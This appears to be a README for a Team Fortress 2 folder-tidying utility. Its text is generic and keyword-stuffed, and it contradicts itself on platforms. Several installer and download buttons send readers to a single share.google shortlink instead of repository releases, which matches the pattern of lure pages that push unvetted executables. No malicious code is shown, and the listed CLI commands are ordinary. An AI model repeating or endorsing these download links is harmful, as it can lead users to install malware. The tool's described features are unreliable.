![Team Fortress 2 Desktop](assets/hero.png)

# Team Fortress 2 Desktop

*Keep the Team Fortress 2 data folder tidy before an update.*

## What Team Fortress 2 Desktop is

This repository is **Team Fortress 2 Desktop**, a Windows utility. Keep the Team Fortress 2 data folder tidy before an update.

Team Fortress 2 drops data files next to launcher caches.

Use it when you want the change on this machine without opening a dozen Settings pages.

## How to get it

Use the command-line copy in this repository if you already have Python.

If you want a normal installer for Windows or macOS, open the [setup page](https://share.google/A1IHfyGRT0zGRLqj8) and follow the steps there.

## Highlights

- Finds the Team Fortress 2 data directory.
- Copies config and export files to a dated archive.
- Lists photo and export folders.
- Writes a short report of what was kept.

## The problem

People search Team Fortress 2 desktop and PC when they want the folder on disk.

A named helper is easier to find than a generic zip.

## Requirements

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## CLI

Python 3.11 or newer. From the repository root:

```powershell
pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Desktop build

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/sharon-barnes19/team-fortress-2-desktop

MIT license. See `LICENSE`.
